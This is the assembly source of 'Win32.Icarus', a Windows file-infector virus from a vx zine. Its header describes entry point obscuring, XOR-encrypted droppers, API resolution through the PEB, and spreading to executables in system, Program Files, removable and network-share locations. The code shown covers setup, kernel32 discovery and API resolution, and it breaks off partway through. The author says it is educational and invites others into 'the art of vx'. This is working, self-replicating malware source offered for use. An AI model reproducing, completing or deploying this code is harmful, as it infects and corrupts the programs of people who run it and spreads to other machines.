; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
;                                                                  %%%%%%%%%%%                                                  ;
;                   %%                                            %%   %%% %%                                                   ;
;   %%             %%                %%%         %%%                   %% %%%                                                   ;
;  %%                              %%%%%%%      %%%%%%                %%% %%%                                                   ;
;  %%                              %%%% %%%    %%%% %%%               %%% %%%                                               %%  ;
;  %%%   %%   %%   %%   %%   %%    %%   %%%   %%%%   %%%              %%% %%%     %%       %%%     %%  %%   %%   %%    %%%  %%  ;
;   %%% %%%% %%%%%%%%% %%%% %%%%       %%%%          %%%           %%%%%% %%%    %%%%%   %%%%%%%% %%%%%%%%%%%%%%%%%%  %%%%%%%   ;
;   %%%%%%%%%%%%% %%%   %%%%%%%%      %%%%           %%%          %%  %%% %%%%  %%%%%    %%  %%% %%%%%%%%  %%%  %%%  %%%%%%%    ;
;   %%%% %%%% %%% %%%   %%%% %%%   %%%%%%           %%%                %%%%%%%  %%%       %% %%%   %%%     %%%  %%%  %%%  %%    ;
;   %%%  %%%  %%% %%%   %%%  %%%       %%%%        %%%                 %%% %%%  %%%      %%%%%%%   %%%     %%%  %%%  %%% %%%    ;
;   %%%  %%%  %%% %%%   %%%  %%%        %%%%      %%%                  %%% %%%  %%%      %% %%%%   %%%     %%%  %%%  %%%%%%%%   ;
;   %%%  %%%  %%% %%%   %%%  %%%  %%     %%%     %%                    %%% %%%  %%%     %%%  %%%   %%%     %%%  %%%    %% %%%   ;
;   %%%  %%%  %%% %%%   %%%  %%%  %%%    %%%    %%                    %%%% %%%  %%%     %%%  %%%   %%%     %%% %%%%   %%  %%%   ;
;   %%%%%%%%%%%%% %%%%% %%%  %%%  %%%%% %%%    %%%%%%%%    %%     %%%%%%%  %%   %%%%%%  %%%%%%%%   %%%%%   %%%%%%%%  %%%%%%%%   ;
;  %% %%%%%%%%%%  %%%% %%%%% %%%%   %%%%%%    %%%%%%%%%%  %%%%   %%%%%%%% %%   %%%%%%   %%%%%%%%% %%%%%    %%%% %%%%%%%%%%%     ;
;       %%   %%    %%    %%   %%     %%%      %%    %%%    %%    %%  %%%%%%       %%     %%   %%    %%      %%   %% %%  %%      ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


; icarus.asm


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
;                            arch...                           ...x86,mmx                                                       ;
;                            api...                            ...win32                                                         ;
;                            libraries...                      ...kernel32,user32                                               ;
;                            payload...                        ...none                                                          ;
;                            features...                                                                                        ;
;                                                                                                                               ;
;                                                                                                                               ;
;                     [+] EPO Engine                                                                                            ;
;                           -> Locates 0xe8 opcode in executable segment                                                        ;
;                           -> Reroutes program flow to EJCE (end of code in segment)                                           ;
;                           -> EJCE will jump and install NOPs to fill complete alignment cavity                                ;
;                           -> Finally, a jump will be made to the first XOR dropper                                            ;
;                                                                                                                               ;
;                     [+] Droppers                                                                                              ;
;                           -> Phase 1 Dropper is located in text segment, which will decrypt the                               ;
;                               Phase 2 Dropper and XOR the payload.                                                            ;
;                           -> Phase 2 Dropper runs a CRC checksum on itself and uses it as apart                               ;
;                               of the XOR key used to decrypt the body                                                         ;
;                                                                                                                               ;
;                     [+] API Resolution                                                                                        ;
;                           -> The base address of kernel32 is determined through fs:0x30 offset                                ;
;                           -> A subroutine will crawl the IAT of kernel32, using function strings                              ;
;                                                                                                                               ;
;                     [+] Supported Assemblies                                                                                  ;
;                           -> C/C++/VC++ of any size                                                                           ;
;                           -> .NET assemblies will NOT be infected                                                             ;
;                           -> A compiler must be used to assemble the binary: Flat assemblies with                             ;
;                               only one segment will NOT be infected                                                           ;
;                           -> Valid PE/DOS headers only                                                                        ;
;                           -> UPX compressed binaries will NOT be infected                                                     ;
;                           -> Complete error checking for anomalous or unknown binaries                                        ;
;                                                                                                                               ;
;                     [+] Spreading                                                                                             ;
;                           -> Any program (*.exe) within the local and Program Files directories                               ;
;                           -> Programs with 0xffee signature will NOT be infected                                              ;
;                           -> Infects C:\windows                                                                               ;
;                           -> Attempt to infect removable & network shares                                                     ;
;                           -> Direct-action infector                                                                           ;
;                                                                                                                               ;
;                     [+] Multithreading                                                                                        ;
;                           -> Original thread decrypts the body                                                                ;
;                           -> A new thread will be started to begin the infection subroutines                                  ;
;                           -> Original thread returns to the function modified by the EPO engine                               ;
;                                                                                                                               ;
;                                                                                                                               ;
;                                    => Icarus was tested on Windows xp & Windows 7.                                            ;
;                                    => over 85% of Windows XP's system was modified by Icarus.                                 ;
;                                    => Infection rate for Windows 7 reduced to about 25-30%.                                   ;
;                                                                                                                               ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;
;
;        
; Note from the author:
;
; Win32.Icarus will be my first lame virus, so it won't contain too much 'groundbreaking' work.
; I started this project in hopes of gaining a firm understanding of the Windows API, x86 assembly
; and hardware. This was written for the EOF #3 release - thanks everyone for your sources, they
; were very helpful.
;
; I have always kept a firm interest in virus design, especially the work from the greats of the 
; vx scene. Hopefully this source code will provide enough for others to get started in the art
; of vx. 
;
; Note that this work is meant for educational purposes only. I will not be held responsible if you
; compile and execute it. This virus will call a debugger after ONE infection. You may change this
; with the INFECT_BREAK alias.
;
; - mos6581 => nopx90 [at] live [dot] ca
;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;


; In order to assemble Icarus, use MASM32

; C:\masm32\bin\ml.exe /c /coff /Cp icarus.asm
; C:\masm32\bin\link.exe /SUBSYSTEM:WINDOWS /lIBPATH:C:\masm32\lib icarus.obj


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»MACHINE TYPE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

.686                                                                       
.model flat,stdcall                                                        
option casemap:none                                                        
assume fs:nothing   
 

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»LIBRARIES/API»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

include     C:\masm32\include\windows.inc                                  
include     C:\masm32\include\kernel32.inc                                 
include     C:\masm32\include\wsock32.inc   
include     C:\masm32\include\user32.inc     
include     C:\masm32\include\gdi32.inc                          
include     C:\masm32\macros\ucmacros.asm            
includelib  C:\masm32\lib\gdi32.lib                 
includelib  C:\masm32\lib\kernel32.lib                                     
includelib  C:\masm32\lib\user32.lib                                       
includelib  C:\masm32\lib\wsock32.lib                 ; not implemented


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»LOCAL VARIABLES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; PRIMARY ROUTINE           [_start_delta]
_shellcode_byte_zero        equ [ebp - 48]              ; Variable containing absolute address to shellcode entry
_shellcode_string_pool      equ [ebp - 8]               ; Absolute address of string pool
_kernel32_base_address      equ [ebp - 12]              ; kernel32.dll
_f_virtualalloc             equ [ebp - 32]              ; VirtualAllocEx
_fpool                      equ [ebp - 4]               ; Function Pointer Pool
_directory_pool             equ [ebp - 56]              ; Address of directory pool (passed to seek)
_raw_strings_pool           equ [ebp - 60]              ; Address of payload strings pool
_gdi_function_strings       equ [ebp - 64]              ; Pool for GDI strings
_user32_address             equ [ebp - 68]              ; Base address of user32 image
_search_string0             equ [ebp - 92]              ; Address of string0
_search_string1             equ [ebp - 96]              ; Address of string1
; The above variables are for the primary routine, and child threads (which have essentially the same stack layout)


; API RESOLUTION ROUTINE    [_routine_resolve_api] 
_api_eat_absolute           equ [ebp - 16]              ; Absolute address of Export Address Table
_api_pe_header              equ [ebp - 20]              ; Absolute address of PE Header
_api_addressofnames         equ [ebp - 24]              ; Absolute address of AddressOfNames
_api_input_parameter        equ [ebp - 28]              ; Input parameter passed through eax
_api_string_index           equ [ebp - 40]              ; Absolute address of current function string
_api_pool_index             equ [ebp - 44]              ; Absolute address of current pool index

; SEEK ROUTINE              [_routine_seek]
_seek_directory_string      equ [ebp - 8]               ; Target directory for traversal (buffer)
_seek_win32finddata_ptr     equ [ebp - 12]              ; Pointer to Win32 Find Data Structure
_seek_fhandle               equ [ebp - 16]              ; Current file handle
_seek_absolute              equ [ebp - 20]              ; Absolute FS file name
; Subroutine used to locate infectable files

; INFECT ROUTINE            [_routine_infect_image]
_infect_target_string       equ [ebp - 8]               ; Absolute name of target file (passed by _routine_seek)
_infect_orig_file_buffer    equ [ebp - 12]              ; Original File Buffer (absolute)
_infect_orig_file_size      equ [ebp - 16]              ; Original File Size
_infect_orig_pe_hdr_abs     equ [ebp - 20]              ; Original PE Header absolute address
_infect_numberofsections    equ [ebp - 24]              ; NumberOfSections Value
_infect_orig_last_seg_abs   equ [ebp - 28]              ; Last Section header absolute address (orig)
_infect_last_seg_orig_size  equ [ebp - 32]              ; Last section original segment size (DWORD) SizeOfRawData
_infect_shellcode_length    equ [ebp - 36]              ; Total size of payload
_infect_mod_file_buffer     equ [ebp - 40]              ; Modified file buffer (expanded size)
_infect_shellcode_entry     equ [ebp - 44]              ; Absolute entry point of shellcode
_infect_mod_pe_hdr_abs      equ [ebp - 48]              ; Absolute address of modified PE Header
_infect_filealignment       equ [ebp - 52]              ; RAW FileAlignment (OptionalHeader)
_infect_mod_file_size       equ [ebp - 56]              ; Modified file size
_infect_mod_last_seg_abs    equ [ebp - 60]              ; Modified Last Segment (Absolute) HEADER
_infect_alignment_padding   equ [ebp - 64]              ; Alignment Padding (payload)
_infect_xor_key             equ [ebp - 68]              ; Phase 2 XOR Key
_infect_dropper             equ [ebp - 72]              ; Absolute address of dropper
_infect_dropper_size        equ [ebp - 76]              ; Size of dropper
_infect_mod_shellcode_abs   equ [ebp - 80]              ; Absolute address of shellcode (modified pool)
_infect_mod_buffer_size     equ [ebp - 84]              ; Size of modified image FIXME
_infect_dropper_oep         equ [ebp - 88]              ; Offset from PHS2 Signature to shellcode OEP
_infect_payload_size        equ [ebp - 92]              ; Size of payload from OEP to PHS2 signature
_infect_epo_return          equ [ebp - 96]              ; Return value of EPO/EJCE engine - contains RVA of host return function
_infect_file_handle         equ [ebp - 100]             ; File handle for current file
_infect_filetime            equ [ebp - 108]             ; 8 Bytes - FILETIME structure
_infect_seg_buffer_temp     equ [ebp - 112]             ; Temporary buffer passed to epo engine (to copy over segments)
_infect_filealignment       equ [ebp - 116]             ; IMAGE_NT_HEADERS->FileAlignment (value)
_infect_opthdrsize          equ [ebp - 120]             ; IMAGE_NT_HEADERS->SizeOfOptionalHeader (value)

; EPO                       [_epo]
_epo_file_buffer            equ [ebp - 4]               ; Address of image buffer         [PARAMETER]
_epo_payload_offset         equ [ebp - 8]               ; Raw offset to payload entry     [PARAMETER]
_epo_pe_header              equ [ebp - 12]              ; PTR to PE Header
_epo_oep                    equ [ebp - 16]              ; Original Entry Point
_epo_code_segment_header    equ [ebp - 20]              ; PTR to code segment header
_epo_raw_oep                equ [ebp - 24]              ; RAW offset to OEP
_epo_raw_oep_ptr            equ [ebp - 28]              ; PTR to RAW OEP
_epo_code_segment_size      equ [ebp - 32]              ; RAW Size of code segment
_epo_call_ptr               equ [ebp - 36]              ; PTR to Call instruction
_epo_call_operand           equ [ebp - 40]              ; Call Operand (DWORD)
_epo_payload_abs            equ [ebp - 44]              ; Absolute address of entire payload
_epo_payload_size           equ [ebp - 48]              ; Total size of dropper/payload
_epo_payload_rva            equ [ebp - 80]              ; RVA of payload                [PARAMETER]
_epo_last_seg               equ [ebp - 84]              ; Absolute address(RAW) of last segment header
_epo_segment_buffer         equ [ebp - 92]              ; Absolute address(RAW) of segment buffer
_epo_call_type              equ [ebp - 100]             ; 0 = e8, 1 = ff15
; Entry Point Obscuring engine

; EJCE
_ejce_alignment_pad_abs     equ [ebp - 52]              ; Raw alignment padding for code segment
_ejce_alignment_pad_size    equ [ebp - 56]              ; Total size of alignment padding
_ejce_jump_chains           equ [ebp - 60]              ; Jump Chains
_ejce_enabled               equ [ebp - 64]              ; Is EJCE Enabled?
_ejce_new_operand           equ [ebp - 68]              ; Modified call operand
_ejce_phase_1_dropper_abs   equ [ebp - 72]              ; Absolute address of phase 1 dropper
_ejce_phase_1_key           equ [ebp - 76]              ; Phase 1 XOR Key
_ejce_return_rva            equ [ebp - 88]              ; Return address of host         [RETURN]
; Extended Jump Chain Engine
; NOTE: EPO + EJCE SHARE ONE STACK FRAME


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»ALIASES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; FRAME 0
VIRUS_SIGNATURE             equ 0ffeeh                  ; Known Signature
INITIAL_STACK_SIZE          equ 128                     ; Frame 0 stack size (default)
DELTA_REALIGNMENT           equ 6                       ; Offset relative to shellcode entry point
FUNCTION_POOL_SIZE          equ 1024                    ; Buffer containing function pointer array for API
PAYLOAD_STACK_SIZE          equ 128                     ; Size of payload stack
PAYLOAD_SLEEP               equ 3000                    ; Length of payload to sleep before execution
; "Main" routine

; SEEK
SEEK_MAX_CURRENT_DIR_BUF    equ 1024                    ; Buffer to store the string for current directory
SEEK_STACK_SIZE             equ 32
SEEK_STRUCT_LIMIT           equ 0f0f0f0f0h              ; Placeholder for seek_structs      
SEEK_SLEEP_BEFORE_NEXT      equ 1                       ; (ms) sleep before calling FINDNEXTFILE  
SEEK_STATIC_PAGE            equ 01000h                  ; 1 page 
    
; INFECT
INFECT_STACK_SIZE           equ 128
MODIFIED_POOL_PREALIGNMENT  equ 02000h                  ; Prealignment (potential) pool size
INFECT_OFST_DRP_KEY         equ 8                       ; Dropper offset for XOR Key stamp
INFECT_OFST_OEP             equ 13                      ; Stamp offset to Payload OEP

; INFECT ERROR CODES        [value]
INFECT_ERROR_SUCCESS        equ 000000001h              ; Normal Return Code
INFECT_ERROR_READ           equ 0fffffff0h              ; Failure opening image or image buffer allocation
INFECT_ERROR_HEADERS        equ 0fc000000h              ; Failure reading binary headers
INFECT_ERROR_SIGNATURE      equ 0fefefefeh              ; Image is already infected
INFECT_ERROR_WRITE          equ 0ffffffffh              ; Image has failed to write
INFECT_ERROR_UPX            equ 044444444h              ; UPX Image
INFECT_ERROR_EPO            equ 0bbbbbbbbh              ; Error with the EPO/EJCE engines
INFECT_ERROR_64             equ 064646464h              ; The binary is 64 bit
INFECT_ERROR_NULL_SEG       equ 010101010h              ; First segment name is NULL
; Note: the error codes are used by _infect

; EPO                        
EPO_STACK_SIZE              equ 128                     ; Stack space for EPO frame

; EJCE
EJCE_MIN_ALIGN_BUFFER       equ 64                      ; Minimum size of alignment buffer (ADJUST)
EJCE_CHAIN_FRAME_SIZE       equ 16                      ; Total size of single chain
EJCE_CHAIN_REDUCE           equ 5                       ; 8x16 = 128 bytes for phase 1 dropper (ADJUST)
EJCE_CHAIN_STACK_FRAME_LEN  equ 12                      ; [0:n][4:PRI][8:OFFSET]
EJCE_PRI_RANDOMIZE_COUNT    equ 128                     ; PRI Randomization loops
EJCE_OFFSET_TO_PHS1         equ 36                      ; Offset to dropper from EJCE delta
EJCE_DROPPER_SIZE           equ 58                      ; Size of dropper
EJCE_BASE_SIGNATURE         equ 0deadbeefh              ; Signature for ejce chain frame
EJCE_MIN_CHAINS             equ 02h                     ; Minimum amount of chains
EJCE_MAX_CHAINS             equ 500h                    ; Max amount of chains (to prevent stack overflow)

; EPO ERROR CODES           [value]
EPO_ERROR_SUCCESS           equ 000000001h              ; Successful
EPO_ERROR_NO_ALIGN          equ 0cccccccch              ; No alignment buffer
EPO_ERROR_HEADER            equ 0aaaaaaaah              ; PE Header signature corruption
EPO_ERROR_NO_CALL           equ 0bbbbbbbbh              ; No suitable call instruction was found
EPO_BINARY_ANOMALY          equ 022222222h              ; Some type of discrepency inside the PE binary
EPO_ERROR_CHAIN_LIM         equ 050505050h              ; Maxmimum limit of chains reached, not infecting
EPO_SEGMENT_BUFFER          equ 0fa00h                  ; Size of "segment buffer" - used to copy over segments in case of 0xcccccccc error

; MISC
NT_HDR_SECURITY_DIR         equ 098h                    ; IMAGE_NT_HEADERS->OptionalHeader.SecurityDirectory (RVA)
; Offset to a specific field
OFFSET_TO_FIRST_SEGMENT     equ 0f8h                    ; PE Header -> First Segment Header
; Offset from PE header to segment header 0
MAX_STRING_SIZE             equ 512                     ; Size of allocated pages for string buffers
; Size of function pointer pool
STRINGS_NOP_BUFFER          equ 16                      ; Size of NOP buffer splitting function strings and misc strings
; Used as padding (fix)
READ_MAX_IMAGE_SIZE         equ 7A12000h                ; Maximum image size (currently 128MB)
; Increase image buffer size
READ_IMAGE_APPEND_SIZE      equ 0c000h                  ; How much "extra" space for buffer
; Temporary buffer
INFECT_TEMP_BUFFER_SIZE     equ 0fa00h                  ; Size of 'segment buffer'

; MISC STRING OFFSETS (static, obsolete)
S_PROG_FILES                equ 0h                      ; Offset to "C:\Program Files\"

; Opcodes
OPCODE_CALL_JZ_E8           equ 0e8h                    ; Relative call
OPCODE_INTERRUPT_CC         equ int 3                   ; Interrupt vector 0xcc
OPCODE_CALL_EV_FF15         equ 0ff15h                  ; Group #5, Call ^ Df64 Ev

; Offsets
OFF_PE_SIZEOFOPTHDR         equ 020h                    ; IMAGE_NT_HEADERS->SizeOfOptionalHeader
EJCE_OFFSET_RVA             equ 17                      ; Offset to payload RVA
EJCE_OFFSET_KEY             equ 27                      ; Offset to key
EJCE_OFFSET_SIZE            equ 22                      ; Offset to size
EJCE_OFFSET_JUMP            equ 49                      ; Offset to jump sequence
EJCE_OFFSET_DELTA           equ 10                      ; Determines base address of module

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»ERROR CODE TABLE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
; eax holds the error code when INFECT_BREAK is set to int 3

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
; [Error Type]            [Value]           [Routine]                   [Description]                                           ;
;                                                                                                                               ;
; SUCCESS                 0x00000001        _infect                     File normally infected                                  ;
; READ                    0xfffffff0        _routine_load_image         Failure to load image into memory                       ;
; WRITE                   0xffffffff        _routine_write_image        Failure to write image (all other routines completed)   ;
; HEADERS                 0xfc000000        _infect                     Mangled PE, MZ, unsuitable segment headers or VM        ;
;                                                                       assembly.                                               ;
; SIGNATURE               0xfefefefe        _infect                     Virus signature already detected in MZ header           ;
; UPX                     0x44444444        _infect                     UPX or other packer detected                            ;
; 64                      0x64646464        _infect                     64-bit assembly detected                                ;
; NULL_SEG                0x10101010        _infect                     First segment header name is NULL                       ;
; EPO                     0xbbbbbbbb        _epo                        General EPO error                                       ;
; EPO_SUCCESS             0x00000001        _epo                        EPO Engine succeeded                                    ;
; EPO_NO_ALIGN            0xcccccccc        _epo                        Alignment padding is insufficient to install dropper    ;
; EPO_HEADER              0xaaaaaaaa        _epo                        Mangled header error generated by EPO                   ;
; EPO_NO_CALL             0xbbbbbbbb        _epo                        No suitable call was found in text segment              ;
; EPO_BINARY_ANOMALY      0x22222222        _epo                        Uninfectable binary                                     ;
; EPO_CHAIN_LIM           0x50505050        _epo                        The alignment padding is far too large (probably a      ;
;                                                                       mangled binary).                                        ;
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;



; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»BREAKPOINTS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; The only interrupt you should worry about is INFECT_BREAK. This breakpoint will be triggered after the first successful
; (or unsuccessful) infection of an executable, with eax returning an error code.
BREAK                       equ OPCODE_INTERRUPT_CC     ; The alias for 0x03 interrupt vector
INFECT_BREAK                equ BREAK                   ; Primary infection routine (warning!)
SEEK_BREAK                  equ nop                     ; Breakpoint BEFORE infection routine is called
DEBUG_PAYLOAD_BREAK         equ nop                     ; Breakpoint BEFORE payload is executed
BREAK_AT_END                equ nop                     ; Break at the end of infection routines?


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»CONFIG OPTIONS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; 1 == TRUE  (enabled)
; 0 == FALSE (disabled)
OPT_WRITE_IMAGE             equ 1                       ; Write completed image to the disk (this will commit changes done on exe)
OPT_INFECT                  equ 1                       ; Call the infection routine?
OPT_USE_DEBUG_PAYLOAD       equ 0                       ; 1st generation only: use a debug payload
OPT_SET_TIME                equ 1                       ; Change the modification time of file


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»MACROS»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

API_CALL MACRO function                                 ; Generic macro for function pointer pool
    mov     eax, _fpool
    mov     eax, [eax + function]
    call    eax
ENDM

STACK MACRO size                                        ; Reserve space for stack and zero
    push    eax
    sub     esp, size
    mov     eax, esp
    mov     ecx, size
    call    _routine_zero_memory
    pop     eax                                         ; Save state of eax register
ENDM

ALLOC_MEM MACRO size                                    ; Allocate memory using VirtualAlloc
    mov     eax, size
    call    _routine_allocate_memory
ENDM

FREE_MEM MACRO address                                  ; Free memory page
    push    MEM_RELEASE
    push    0                                           ; dwsize
    push    address                                     ; lpAddress
    API_CALL f_virtualfree
ENDM

FINDNEXTFILE MACRO
    assume    ebx:ptr seek_struct
    mov     ebx, esp
    mov     DWORD PTR eax, [ebx].fdata                  ; Load pointer to WIN32_FIND_DATA struct
    mov     ecx, SIZEOF WIN32_FIND_DATA
    call    _routine_zero_memory                        ; Zero struct
    push    [ebx].fdata
    push    [ebx].handle
    API_CALL f_findnextfile
    assume  ebx:nothing
ENDM

SLEEP MACRO time
    push    time
    API_CALL f_sleep
ENDM   

CREATE_CELL MACRO                                       ; Macro creates a new structure in the stack
    sub     esp, SIZEOF seek_struct
    mov     eax, esp
    pusha
    mov     ecx, SIZEOF seek_struct
    call    _routine_zero_memory
    popa
ENDM

CLOSE_HANDLE MACRO handle
    push    handle
    API_CALL f_closehandle
ENDM
    

; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»STRUCTURES»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

; EJCE CHAIN STRUCT
ejce_chain            STRUCT
    n                 DWORD ?                           ; Chain identifier
    pri               DWORD ?                           ; Chain priority
    jump_offset       DWORD ?                           ; Chain Jump Offset
ejce_chain            EndS

; Seek Directory Struct
seek_struct           STRUCT
    handle            DWORD ?                           ; Current File Handle
    buffer            DWORD ?                           ; Address of string
    fdata             DWORD ?                           ; Pointer to buffer containing WIN32_FIND_DATA struct
seek_struct           EndS

; Seek data struct (not implemented)
seek_data             STRUCT
    csize             DWORD ?                           ; Size of the entire cell (directory string size varies)
    handle            DWORD ?                           ; Handle to the search API
    fdata             BYTE 13eh dup(?)                  ; SIZEOF WIN32_FIND_DATA
seek_data             EndS


; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»CODE»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;

.code

    ; The Phase 2 dropper passes control to here (below is encrypted)
start:
    nop                                                 ; ENTRY POINT! SHELLCODE BYTE ZERO!
    call    _start_delta
    
    ; ---------- ;
    byte     'L' ;                                      ; Limit
    byte     'I' ;
    byte     'M' ;
    byte     'M' ;
    ; ---------- ;
    
_start_delta:

;           »»» INITIALIZE STACK ««« 
    pop     eax                                         ; eax is absolute address of _start_delta
    sub     eax, DELTA_REALIGNMENT                      ; align to shellcode byte zero - careful
    push    ebp                                         ; sfp
    mov     ebp, esp
    sub     DWORD PTR esp, INITIAL_STACK_SIZE
    push    eax                                         ; save to stack (temp)
    lea     DWORD PTR eax, [esp + 4]                    ; absolute address of stack top
    mov     DWORD PTR ecx, INITIAL_STACK_SIZE
    call    _routine_zero_memory                        ; Zero Stack
    pop     eax                                         ; shellcode byte zero
    mov     DWORD PTR _shellcode_byte_zero, eax         ; commit

;           »»»  FIND FUNCTION STRING POOL «««   
    mov     DWORD PTR esi, _shellcode_byte_zero         ; esi is shellcode entry point
@s0: 
    lodsb                                               
    cmp     BYTE PTR al, 050h                           ; P
    jne     @s0
    nop
    dec     esi
    mov     DWORD PTR eax, [esi]
    inc     esi
    mov     DWORD PTR ebx, 073b3068eh
    xor     ebx, 03ffc49deh
    cmp     DWORD PTR eax, ebx    
    jne     @s0     
    add     esi, 3                                      ; align
    mov     DWORD PTR _shellcode_string_pool, esi       ; commit  
    
;           »»» FIND MISC STRING POOL ««« 
    mov     edi, esi
@s1:
    lodsb                                               ; Load byte into al register
    cmp     BYTE PTR al, 090h                           ; Start of NOP pool?
    jne     @s1
    add     esi, STRINGS_NOP_BUFFER                     ; Move to misc strings buffer
    dec     esi                                         ; adjust
    mov     DWORD PTR _raw_strings_pool, esi            ; Commit to stack

;           »»» KERNEL32 LIBRARY ««« 
    mov     DWORD PTR eax, fs:[30h]                     ; fs segment offset 0x30
    mov     eax, [eax + 0ch]
    mov     eax, [eax + 01ch]
    mov     eax, [eax]
    mov     eax, [eax + 08h]                            ; eax is absolute address of kernel32.dll
    xchg    ebx, eax
    mov     WORD PTR ax, [ebx]                          ; MZ Header
    cmp     WORD PTR ax, 05a4dh
    ; FIXME! this should return to host!
    jne     _routine_crash  
    mov     DWORD PTR _kernel32_base_address, ebx       ; commit      

;           »»» RESOLVE VIRTUALALLOC ««« 
    ; [+] WARNING: ALL GENERAL PURPOSE REGISTERS RESET AFTER SUBROUTINE
    mov     DWORD PTR eax, _shellcode_string_pool       ; move VirtuaAlloc to eax
    call    _routine_resolve_api                        ; returns only VirtualAlloc
    test    eax, eax
    je      _routine_crash                              ; FIXME!!
    mov     DWORD PTR _f_virtualalloc, eax              ; Commit to stack

;           »»» ALLOCATE FUNCTION POINTER BUFFER ««« 
    push    PAGE_READWRITE
    push    MEM_COMMIT
    push    FUNCTION_POOL_SIZE
    push    0
    mov     DWORD PTR eax, _f_virtualalloc
    call    eax
    cmp     eax, 0
    je      _routine_crash                              ; FIXME!!!
    mov     DWORD PTR _fpool, eax                       ; Commit to stack

;           »»» RESOLVE REMAINING LIBRARY FUNCTIONS ««« 
    xor     eax, eax                                    ; All functions
    call    _routine_resolve_api

comment /*
;           »»» RESOLVE GDI FUNCTIONS ««« 
    mov     DWORD PTR esi, _raw_strings_pool            ; Find the GDI function strings
    xor     al, al
@s00:
    lodsb    
    test    al, al                                      ; jump if no null is found
    jne     @s00
    dec     esi
    mov     DWORD PTR eax, [esi + 4]
    inc     esi
    cmp     DWORD PTR eax, 0                            ; Zero?
    jne     @s00
    add     esi, 4
    mov     DWORD PTR _gdi_function_strings, esi        ; Commit to stack
    ; Resolve user32.dll
    ; lld. 23re su
    int 3
    push    0
    push    'su'
    push    '23re'
    push    'lld.'
    push    esp
/*    

;           »»» DETERMINE HOST BINARY ««« 
    ;jmp        _subhost_payload (DEBUG)
    push    0
    API_CALL f_getmodulehandle
    assume  eax:ptr IMAGE_DOS_HEADER
    mov     WORD PTR ax, [eax].e_cs
    cmp     WORD PTR ax, VIRUS_SIGNATURE
    je      _subhost_payload
    assume  eax:nothing    
    
; »»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»HOST PAYLOAD»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ;
;                                                                                                                               ;
;                                   This payload is executed by the 1st generation of the virus.                                ;
;                                   Although its only function is to jump to _payload_crawl, which will                         ;
